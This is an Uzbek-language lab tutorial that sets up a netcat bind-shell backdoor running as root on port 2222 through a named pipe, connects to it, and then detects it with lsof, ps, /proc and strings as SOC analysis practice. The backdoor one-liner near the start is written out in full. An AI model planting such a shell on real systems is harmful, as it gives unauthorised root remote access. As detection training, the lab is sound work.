## Linux CLI (backdoor)

Assalom Alaykum bugungi Laboratoriya ishimizda Linux CLI orqali Backdoorlar xosil qilishni ko'rib chiqamiz.Qani kettik!!!

Backdoor nima ekanligini va u nima qilishini yaxshiroq tushunish uchun biz ko'p turli xil asosiy buyruqlardan foydalanamiz.



Ushbu laboratoriya uchun biz 3 ta turli linux terminallarini ishga tushiramiz.

***Birinchisi, biz orqa eshikni boshqaradigan joy bo'ladi.***
***Ikkinchisi, biz unga ulanadigan joy bo'ladi.***
***Uchinchisi, biz tahlil qiladigan oyna yan'ni,Processlarni ko'rish uchun.***



**Terminalni administrator sifatida ochishdan boshlaymiz.**


Linux terminalingizda quyidagi buyruqni bajaring:
```python
sudo su -
```
Bu bizni root ./ snapga o'tkazadi. Biz buni bajardik,biz root sifatida ishlaydigan backdoor va tizimdagi boshqa foydalanuvchi hisobidan ulanishni boshlaymiz.
Keyinchalik biz `fifo` orqa quvurini yaratishimiz kerak.Birinchi Terminalga:

```python
mknod backpipe p
```

Keyin,backpipe make qilishni boshlaylik:

`/bin/bash 0<backpipe | nc -l 2222 1>backpipe`

Yuqoridagi buyruqda biz barcha ma'lumotlarni backpipe orqali, so'ngra bash seansiga yo'naltiradigan netcat tinglovchisini yaratmoqdamiz. Keyin u bash sessiyasining natijasini oladi va uni yana netcat tinglovchisiga qo'yadi.


Asosan, bu bizning Linux tizimimizning 2222-portida backdoor tinglanilishni yaratadi.

Endi boshqa terminalini ochamiz. Bu biz yuqorida yaratilgan orqa eshik bilan bog'laydigan terminal bo'ladi.

Endi biz Linux tizimimizning IP manzilini bilishimiz kerak bo'ladi:
```python
ifconfig
```

Endi ulanamiz:

```python
 nc 172.30.249.49 2222
```

Eslatma!!! Albatta,sizning IP manzilingiz boshqacha bo'ladi!!!

Keling, ba'zi buyruqlarni yozamiz va u ishlayotganiga ishonch hosil qilamiz

```bash
ls
```
```bash
whoami
```

Ko'rib turganingizdek, biz root sifatida oddiy Linux backdooriga ulanganmiz. Shuningdek, orqa eshikka muvaffaqiyatli ulanganimiz haqida xabar yo'qligiga e'tibor bering. Bu shunchaki kursorimizni ekranning chap tomoniga qaytaradi.

Keling, yana bir terminalini ochamiz va tahlil qilishni boshlaymiz. Bu shuni anglatadiki, bizda orqa eshikni yaratgan joy bor, ikkinchisi unga ulangan va uchinchisi tahlil uchun bo'ladi.

Linux terminalingizda quyidagi buyruqni bajaring
```python
sudo su -
```

Bu bizni root file qatoriga olib boradi. Biz superuser bo'ldik, chunki tarmoq ulanishlari va tizim bo'ylab ma'lumotlarni qayta ishlash rootga kirishni talab qiladi. Asosan, root yoki administrator huquqlarisiz SOC pro sifatida ishingizni qilish juda qiyin.

Keling, `lsof` bilan tarmoq ulanishlarini ko'rib chiqaylik. `lsof` dan foydalanganda biz ochiq fayllarni ko'rib chiqamiz. `-i` bayrog'idan foydalanganda biz ochiq Internet ulanishlarini ko'rib chiqamiz. Biz `-P` bayrog'ini ishlatganimizda, biz `lsof` -ga foydalanilayotgan portlarda xizmat nima ekanligini taxmin qilmaslikni ko'rsatamiz. Faqat port raqami bilan.

```python
lsof -i -P
```


Endi netcat jarayon identifikatorini ko'rib chiqamiz. Buni kichik harfli `p` kaliti bilan qilishimiz mumkin. Bu bizga sanab o'tilgan jarayon identifikatori bilan bog'liq barcha ochiq fayllarni beradi.

```python
lsof -p 131
```

Keling, to'liq jarayonlarni ko'rib chiqaylik. Buni `ps` buyrug'i bilan qilamiz. Shuningdek, biz yordamchi kalitlarni qo'shamiz. Bu barcha jarayonlar uchun, `u` foydalanuvchi tomonidan tartiblangan va `x` uchun teletayp terminali yordamida jarayonlarni o'z ichiga oladi.

```python
ps aux
```

Keling, ushbu pid uchun kataloglarni proc katalogiga o'zgartiraylik. Esingizda bo'lsin, proc diskda mavjud bo'lmagan katalogdir. Bu bizga turli jarayonlar bilan bog'liq ma'lumotlarni bevosita ko'rish imkonini beradi. Bu juda foydali, chunki u hozirda shubhali tizimda ishlayotgan jarayonning xotirasini chuqurlashtirishga imkon beradi.

```bash
cd /proc/[pid]
```

Biz bu yerda bir nechta turli-xil kataloglarni ko'rishimiz mumkin:

```python
ls
```

Eslatma!!! Sizning PID ingiz boshqacha bo'ladi!!!

Ushbu katalogdagi exe-da satrlarni ishga tushirishimiz mumkin. Bu juda va juda foydali, chunki dasturlar yaratilganda foydalanish ma'lumotlari, tizim kutubxonalari haqida eslatmalar va mumkin bo'lgan kod sharhlari bo'lishi mumkin. Biz har doim dastur nima qilayotganini aniqlash uchun foydalanamiz.

```bash
strings ./exe
```

Biz bunda,netcat uchun haqiqiy foydalanish ma'lumotlarini ko'rishimiz mumkin. Biz uni to'g'ridan-to'g'ri xotiradan olib tashladik!



